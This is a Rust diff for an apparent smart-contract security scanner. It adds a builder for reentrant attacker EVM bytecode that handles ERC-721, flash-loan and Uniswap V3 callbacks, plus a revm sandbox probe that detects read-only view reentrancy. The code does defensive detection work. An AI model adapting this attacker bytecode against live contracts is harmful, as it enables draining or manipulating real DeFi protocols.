@@ -267,6 +267,235 @@ fn build_forwarding_reentrant_attacker(max_calls: u8, reenter_calldata: &[u8]) -
     code
 }
 
+/// Known DeFi/NFT callback selectors that trigger reentrant execution (`onERC721Received`,
+/// `onFlashLoan`, `uniswapV3SwapCallback`).
+pub const SEL_ON_ERC721_RECEIVED: [u8; 4] = [0x15, 0x0b, 0x7a, 0x02];
+pub const SEL_ON_FLASH_LOAN: [u8; 4] = [0x23, 0xe3, 0x0c, 0x8b];
+pub const SEL_UNIV3_SWAP_CALLBACK: [u8; 4] = [0xfa, 0x46, 0x1e, 0x33];
+
+/// Builds a callback-aware reentrant attacker EVM bytecode that handles `onERC721Received`,
+/// `onFlashLoan`, and `uniswapV3SwapCallback` (returning the expected ERC-721/ERC-3156 magic
+/// selector) while re-entering `VICTIM_ADDR` with `reenter_calldata` up to `max_reentries` times.
+pub fn build_callback_reentrant_attacker(
+    callback_selector: [u8; 4],
+    magic_return: [u8; 32],
+    max_reentries: u8,
+    reenter_calldata: &[u8],
+) -> Vec<u8> {
+    let mut code = Vec::new();
+    // If CALLDATASIZE >= 4 && first 4 bytes == callback_selector -> jump to callback_pc;
+    // else if CALLDATASIZE > 0 -> jump to forwarder_pc; else -> callback_pc (ETH receive).
+    code.extend_from_slice(&[0x36, 0x60, 0x04, 0x10]); // CALLDATASIZE, PUSH1 4, LT (size < 4)
+    let small_cd_jump_idx = code.len() + 1;
+    code.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 callback_pc, JUMPI
+
+    // Compare first 4 bytes of calldata against callback_selector
+    code.extend_from_slice(&[0x60, 0x00, 0x35, 0x60, 0xe0, 0x1c]); // PUSH1 0, CALLDATALOAD, PUSH1 224, SHR
+    code.push(0x63);
+    code.extend_from_slice(&callback_selector); // PUSH4 callback_selector
+    code.push(0x14); // EQ
+    let cb_match_jump_idx = code.len() + 1;
+    code.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 callback_pc, JUMPI
+
+    // Forwarder branch: forward calldata + value to VICTIM_ADDR
+    code.extend_from_slice(&[
+        0x36, 0x60, 0x00, 0x60, 0x00, 0x37, // CALLDATACOPY
+        0x60, 0x00, 0x60, 0x00, 0x36, 0x60, 0x00, 0x34, // ret/arg/value
+        0x61, 0x20, 0x00, // VICTIM_ADDR
+        0x62, 0x1e, 0x84, 0x80, 0xf1, // PUSH3 2_000_000, CALL
+        0x50, 0x00, // POP, STOP
+    ]);
+
+    // Callback branch: increment slot[0]; if <= max_reentries, call VICTIM_ADDR(reenter_calldata); return magic_return
+    let callback_pc = code.len() as u16;
+    code[small_cd_jump_idx..small_cd_jump_idx + 2].copy_from_slice(&callback_pc.to_be_bytes());
+    code[cb_match_jump_idx..cb_match_jump_idx + 2].copy_from_slice(&callback_pc.to_be_bytes());
+    code.extend_from_slice(&[
+        0x5b, // JUMPDEST (callback_pc)
+        0x60,
+        0x00,
+        0x54, // SLOAD(0)
+        0x60,
+        0x01,
+        0x01, // ADD 1
+        0x80,
+        0x60,
+        0x00,
+        0x55, // DUP1, SSTORE(0)
+        0x60,
+        max_reentries,
+        0x11, // GT (count > max_reentries)
+    ]);
+    let ret_jump_idx = code.len() + 1;
+    code.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 ret_pc, JUMPI
+
+    // Copy reenter_calldata into memory and CALL VICTIM_ADDR
+    for (chunk_idx, chunk) in reenter_calldata.chunks(32).enumerate() {
+        let mut word = [0u8; 32];
+        word[..chunk.len()].copy_from_slice(chunk);
+        code.push(0x7f);
+        code.extend_from_slice(&word);
+        let mem_off = (chunk_idx * 32) as u8;
+        code.extend_from_slice(&[0x60, mem_off, 0x52]);
+    }
+    let cd_len = reenter_calldata.len() as u16;
+    code.extend_from_slice(&[0x60, 0x00, 0x60, 0x00]);
+    code.push(0x61);
+    code.extend_from_slice(&cd_len.to_be_bytes());
+    code.extend_from_slice(&[0x60, 0x00, 0x60, 0x00, 0x61, 0x20, 0x00]);
+    code.extend_from_slice(&[0x62, 0x0c, 0x35, 0x00, 0xf1, 0x50]); // CALL(800_000), POP
+
+    // Return magic 32-byte word (e.g. `onERC721Received.selector` padded in MSB)
+    let ret_pc = code.len() as u16;
+    code[ret_jump_idx..ret_jump_idx + 2].copy_from_slice(&ret_pc.to_be_bytes());
+    code.push(0x5b); // JUMPDEST (ret_pc)
+    code.push(0x7f); // PUSH32 magic_return
+    code.extend_from_slice(&magic_return);
+    code.extend_from_slice(&[0x60, 0x00, 0x52, 0x60, 0x20, 0x60, 0x00, 0xf3]); // MSTORE(0), RETURN(0, 32)
+    code
+}
+
+/// Probes compiled bytecode for **Read-Only View Reentrancy** inside in-process `revm`:
+/// invokes `view_calldata` during the mid-execution reentrant callback (storing the observed
+/// 32-byte return value in attacker slot `1`), then calls `view_calldata` again post-transaction.
+/// If the mid-execution view value differs from the post-transaction steady-state value, the
+/// view-oracle manipulation is **PROVEN**.
+pub fn probe_view_reentrancy_in_revm(
+    deployed_bytecode: &[u8],
+    mutator_calldata: &[u8],
+    view_calldata: &[u8],
+) -> RevmWitnessResult {
+    if deployed_bytecode.is_empty() || view_calldata.is_empty() {
+        return RevmWitnessResult {
+            proven: false,
+            drained_wei: U256::ZERO,
+            profit_wei: U256::ZERO,
+            gas_used: 0,
+            summary: "missing bytecode or view calldata".into(),
+        };
+    }
+
+    // Build attacker bytecode:
+    // - CALLDATASIZE == 0 -> ETH receive callback: STATICCALL VICTIM_ADDR(view_calldata) -> SSTORE(1), SSTORE(2, 1)
+    // - CALLDATASIZE == 1 -> post-tx steady-state probe: STATICCALL VICTIM_ADDR(view_calldata) -> SSTORE(3)
+    // - CALLDATASIZE >= 2 -> forward mutator calldata to VICTIM_ADDR
+    let mut attacker = Vec::new();
+    attacker.extend_from_slice(&[0x36, 0x60, 0x01, 0x11]); // CALLDATASIZE > 1
+    let fwd_jump_idx = attacker.len() + 1;
+    attacker.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 fwd_pc, JUMPI
+
+    // Both CALLDATASIZE==0 (mid-callback) and CALLDATASIZE==1 (post-tx) run STATICCALL VICTIM_ADDR(view_calldata)
+    for (chunk_idx, chunk) in view_calldata.chunks(32).enumerate() {
+        let mut word = [0u8; 32];
+        word[..chunk.len()].copy_from_slice(chunk);
+        attacker.push(0x7f);
+        attacker.extend_from_slice(&word);
+        let mem_off = (chunk_idx * 32) as u8;
+        attacker.extend_from_slice(&[0x60, mem_off, 0x52]);
+    }
+    let vlen = view_calldata.len() as u16;
+    attacker.extend_from_slice(&[0x60, 0x20, 0x60, 0x40]); // retSize=32, retOff=0x40
+    attacker.push(0x61);
+    attacker.extend_from_slice(&vlen.to_be_bytes()); // argSize
+    attacker.extend_from_slice(&[0x60, 0x00, 0x61, 0x20, 0x00]); // argOff=0, VICTIM_ADDR
+    attacker.extend_from_slice(&[0x62, 0x07, 0xa1, 0x20, 0xfa, 0x50]); // PUSH3 500_000, STATICCALL, POP
+    // If CALLDATASIZE == 1 -> store into slot[3]; else -> store into slot[1] and mark slot[2] = 1
+    attacker.extend_from_slice(&[0x36, 0x60, 0x01, 0x14]); // CALLDATASIZE == 1
+    let post_jump_idx = attacker.len() + 1;
+    attacker.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 post_pc, JUMPI
+    attacker.extend_from_slice(&[0x60, 0x40, 0x51, 0x60, 0x01, 0x55]); // MLOAD(0x40), SSTORE(1)
+    attacker.extend_from_slice(&[0x60, 0x01, 0x60, 0x02, 0x55, 0x00]); // SSTORE(2, 1), STOP
+
+    let post_pc = attacker.len() as u16;
+    attacker[post_jump_idx..post_jump_idx + 2].copy_from_slice(&post_pc.to_be_bytes());
+    attacker.extend_from_slice(&[0x5b, 0x60, 0x40, 0x51, 0x60, 0x03, 0x55, 0x00]); // JUMPDEST, MLOAD(0x40), SSTORE(3), STOP
+
+    let fwd_pc = attacker.len() as u16;
+    attacker[fwd_jump_idx..fwd_jump_idx + 2].copy_from_slice(&fwd_pc.to_be_bytes());
+    attacker.extend_from_slice(&[
+        0x5b, // JUMPDEST
+        0x36, 0x60, 0x00, 0x60, 0x00, 0x37, // CALLDATACOPY
+        0x60, 0x00, 0x60, 0x00, 0x36, 0x60, 0x00, 0x34, // ret/arg/value
+        0x61, 0x20, 0x00, // VICTIM_ADDR
+        0x62, 0x1e, 0x84, 0x80, 0xf1, 0x50, 0x00, // CALL(2_000_000), POP, STOP
+    ]);
+
+    let five_eth = U256::from(5_000_000_000_000_000_000u128);
+    let accounts = vec![
+        (EOA_ADDR, five_eth, None, vec![]),
+        (
+            VICTIM_ADDR,
+            five_eth,
+            Some(deployed_bytecode.to_vec()),
+            vec![],
+        ),
+        (ATTACKER_ADDR, U256::ZERO, Some(attacker), vec![]),
+    ];
+    let txs = vec![
+        CallProbeSpec {
+            caller: EOA_ADDR,
+            target: ATTACKER_ADDR,
+            value: U256::ZERO,
+            data: mutator_calldata.to_vec(),
+        },
+        CallProbeSpec {
+            caller: EOA_ADDR,
+            target: ATTACKER_ADDR,
+            value: U256::ZERO,
+            data: vec![0x01],
+        },
+    ];
+
+    match execute_revm_sequence(accounts, &txs) {
+        Ok((gas_used, _, db)) => {
+            let cb_hit = db
+                .cache
+                .accounts
+                .get(&ATTACKER_ADDR)
+                .and_then(|a| a.storage.get(&U256::from(2)))
+                .copied()
+                .unwrap_or(U256::ZERO);
+            let mid_val = db
+                .cache
+                .accounts
+                .get(&ATTACKER_ADDR)
+                .and_then(|a| a.storage.get(&U256::from(1)))
+                .copied()
+                .unwrap_or(U256::ZERO);
+            let post_val = db
+                .cache
+                .accounts
+                .get(&ATTACKER_ADDR)
+                .and_then(|a| a.storage.get(&U256::from(3)))
+                .copied()
+                .unwrap_or(U256::ZERO);
+            let proven = cb_hit != U256::ZERO && mid_val != post_val;
+            RevmWitnessResult {
+                proven,
+                drained_wei: U256::ZERO,
+                profit_wei: mid_val.abs_diff(post_val),
+                gas_used,
+                summary: if proven {
+                    format!(
+                        "revm PROVEN Read-Only View Reentrancy: mid-callback view={mid_val} != post-tx view={post_val} (gas={gas_used})"
+                    )
+                } else {
+                    format!(
+                        "view reentrancy probe observed consistent view state (cb_hit={cb_hit}, gas={gas_used})"
+                    )
+                },
+            }
+        }
+        Err(err) => RevmWitnessResult {
+            proven: false,
+            drained_wei: U256::ZERO,
+            profit_wei: U256::ZERO,
+            gas_used: 0,
+            summary: format!("revm view reentrancy probe error: {err}"),
+        },
+    }
+}
+
 /// Probes real compiled Foundry/solc `deployed_bytecode` for ETH drain reentrancy inside in-process `revm`.
 pub fn probe_compiled_reentrancy_in_revm(
     deployed_bytecode: &[u8],
